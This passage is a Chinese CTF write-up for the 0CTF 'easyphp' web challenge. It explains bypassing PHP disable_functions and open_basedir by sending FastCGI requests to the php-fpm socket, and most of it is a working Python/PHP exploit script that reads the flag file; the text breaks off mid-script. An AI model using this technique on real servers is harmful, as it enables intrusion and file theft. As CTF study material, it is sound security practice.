    <content type="html"><![CDATA[<p>又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz</p><a id="more"></a><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>直接给了 webshell, 看 phpinfo,  </p><p>disable_functions:<br>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl<br>open_basedir: /var/www/html<br>disable_classes: ReflectionClass<br>Server API:    FPM/FastCGI  </p><p>看样子是需要 rce, 有 disable_functions 和 open_basedir 的限制, 这里可以看到用的是 fpm 而且 fsockopen 没有限制, 可以想到直接打 fcgi, 不过需要知道 unix socket 的路径, 这里可以用 DirectoryIterator 来列目录, 不过试了下只能列根目录, 其他地方还是会被 open_basedir 拦, 比较神奇. 不过好在 fuzz 了一下, 是个常见未知, 在 <code>unix:///var/run/php-fpm.sock</code>.<br>之后就不用多说了, 用 PHP_VALUE 里面的 open_basedir 覆盖掉 php.ini 里的 open_basedir 即可.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_php_code</span><span class="params">(s)</span>:</span></span><br><span class="line">    res = sess.post(<span class="string">'http://pwnable.org:19260/?rh=eval($_POST[a]);'</span>, data=&#123;<span class="string">"a"</span>: s&#125;)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">class AA</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    const VERSION_1            = 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const BEGIN_REQUEST        = 1;</span></span><br><span class="line"><span class="string">    const ABORT_REQUEST        = 2;</span></span><br><span class="line"><span class="string">    const END_REQUEST          = 3;</span></span><br><span class="line"><span class="string">    const PARAMS               = 4;</span></span><br><span class="line"><span class="string">    const STDIN                = 5;</span></span><br><span class="line"><span class="string">    const STDOUT               = 6;</span></span><br><span class="line"><span class="string">    const STDERR               = 7;</span></span><br><span class="line"><span class="string">    const DATA                 = 8;</span></span><br><span class="line"><span class="string">    const GET_VALUES           = 9;</span></span><br><span class="line"><span class="string">    const GET_VALUES_RESULT    = 10;</span></span><br><span class="line"><span class="string">    const UNKNOWN_TYPE         = 11;</span></span><br><span class="line"><span class="string">    const MAXTYPE              = self::UNKNOWN_TYPE;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const RESPONDER            = 1;</span></span><br><span class="line"><span class="string">    const AUTHORIZER           = 2;</span></span><br><span class="line"><span class="string">    const FILTER               = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const REQUEST_COMPLETE     = 0;</span></span><br><span class="line"><span class="string">    const CANT_MPX_CONN        = 1;</span></span><br><span class="line"><span class="string">    const OVERLOADED           = 2;</span></span><br><span class="line"><span class="string">    const UNKNOWN_ROLE         = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const MAX_CONNS            = 'MAX_CONNS';</span></span><br><span class="line"><span class="string">    const MAX_REQS             = 'MAX_REQS';</span></span><br><span class="line"><span class="string">    const MPXS_CONNS           = 'MPXS_CONNS';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const HEADER_LEN           = 8;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Socket</span></span><br><span class="line"><span class="string">     * @var Resource</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_sock = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Host</span></span><br><span class="line"><span class="string">     * @var String</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_host = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Port</span></span><br><span class="line"><span class="string">     * @var Integer</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_port = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Keep Alive</span></span><br><span class="line"><span class="string">     * @var Boolean</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_keepAlive = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Constructor</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $host Host of the FastCGI application</span></span><br><span class="line"><span class="string">     * @param Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_host = $host;</span></span><br><span class="line"><span class="string">        $this-&gt;_port = $port;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="string">     * alive at the end of a request</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function setKeepAlive($b)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_keepAlive = (boolean)$b;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            fclose($this-&gt;_sock);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get the keep alive status</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getKeepAlive()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        return $this-&gt;_keepAlive;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function connect()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;_sock = fsockopen($this-&gt;_host);</span></span><br><span class="line"><span class="string">            var_dump($this-&gt;_sock);</span></span><br><span class="line"><span class="string">            if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">                throw new Exception('Unable to connect to FastCGI application');</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build a FastCGI packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Integer $type Type of the packet</span></span><br><span class="line"><span class="string">     * @param String $content Content of the packet</span></span><br><span class="line"><span class="string">     * @param Integer $requestId RequestId</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildPacket($type, $content, $requestId = 1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $clen = strlen($content);</span></span><br><span class="line"><span class="string">        return chr(self::VERSION_1)         /* version */</span></span><br><span class="line"><span class="string">            . chr($type)                    /* type */</span></span><br><span class="line"><span class="string">            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */</span></span><br><span class="line"><span class="string">            . chr($requestId &amp; 0xFF)        /* requestIdB0 */</span></span><br><span class="line"><span class="string">            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */</span></span><br><span class="line"><span class="string">            . chr($clen &amp; 0xFF)             /* contentLengthB0 */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* paddingLength */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* reserved */</span></span><br><span class="line"><span class="string">            . $content;                     /* content */</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $name Name</span></span><br><span class="line"><span class="string">     * @param String $value Value</span></span><br><span class="line"><span class="string">     * @return String FastCGI Name value pair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildNvpair($name, $value)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $nlen = strlen($name);</span></span><br><span class="line"><span class="string">        $vlen = strlen($value);</span></span><br><span class="line"><span class="string">        if ($nlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr($nlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($vlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr($vlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        /* nameData &amp; valueData */</span></span><br><span class="line"><span class="string">        return $nvpair . $name . $value;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="string">     * @return array of NVPair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readNvpair($data, $length = null)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $array = array();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($length === null) &#123;</span></span><br><span class="line"><span class="string">            $length = strlen($data);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $p = 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        while ($p != $length) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $nlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($nlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $vlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($vlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span></span><br><span class="line"><span class="string">            $p += ($nlen + $vlen);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return $array;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data String containing all the packet</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function decodePacketHeader($data)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $ret = array();</span></span><br><span class="line"><span class="string">        $ret['version']       = ord($data&#123;0&#125;);</span></span><br><span class="line"><span class="string">        $ret['type']          = ord($data&#123;1&#125;);</span></span><br><span class="line"><span class="string">        $ret['requestId']     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);</span></span><br><span class="line"><span class="string">        $ret['contentLength'] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);</span></span><br><span class="line"><span class="string">        $ret['paddingLength'] = ord($data&#123;6&#125;);</span></span><br><span class="line"><span class="string">        $ret['reserved']      = ord($data&#123;7&#125;);</span></span><br><span class="line"><span class="string">        return $ret;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readPacket()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;decodePacketHeader($packet);</span></span><br><span class="line"><span class="string">            $resp['content'] = '';</span></span><br><span class="line"><span class="string">            if ($resp['contentLength']) &#123;</span></span><br><span class="line"><span class="string">                $len  = $resp['contentLength'];</span></span><br><span class="line"><span class="string">                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;</span></span><br><span class="line"><span class="string">                    $len -= strlen($buf);</span></span><br><span class="line"><span class="string">                    $resp['content'] .= $buf;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            if ($resp['paddingLength']) &#123;</span></span><br><span class="line"><span class="string">                $buf=fread($this-&gt;_sock, $resp['paddingLength']);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return $resp;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getValues(array $requestedInfo)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $request = '';</span></span><br><span class="line"><span class="string">        foreach ($requestedInfo as $info) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildNvpair($info, '');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">        if ($resp['type'] == self::GET_VALUES_RESULT) &#123;</span></span><br><span class="line"><span class="string">            return $this-&gt;readNvpair($resp['content'], $resp['length']);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public function request(array $params, $stdin)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $response = '';</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $paramsRequest = '';</span></span><br><span class="line"><span class="string">        foreach ($params as $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="string">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($paramsRequest) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::PARAMS, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($stdin) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::STDIN, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        do &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span></span><br><span class="line"><span class="string">                $response .= $resp['content'];</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Bad request');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        switch (ord($resp['content'][4])) &#123;</span></span><br><span class="line"><span class="string">            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="string">                throw new Exception('This app cant multiplex [CANT_MPX_CONN]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::OVERLOADED:</span></span><br><span class="line"><span class="string">                throw new Exception('New request rejected; too busy [OVERLOADED]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="string">                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="string">                return $response;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$client = new AA("unix:///var/run/php-fpm.sock");</span></span><br><span class="line"><span class="string">$req = '/var/www/html/index.php';</span></span><br><span class="line"><span class="string">$uri = $req .'?'.'command=ls';</span></span><br><span class="line"><span class="string">var_dump($client);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$code = "&lt;?php var_dump(scandir('/'));echo base64_encode(file_get_contents('/flag.h'));\\n?&gt;";</span></span><br><span class="line"><span 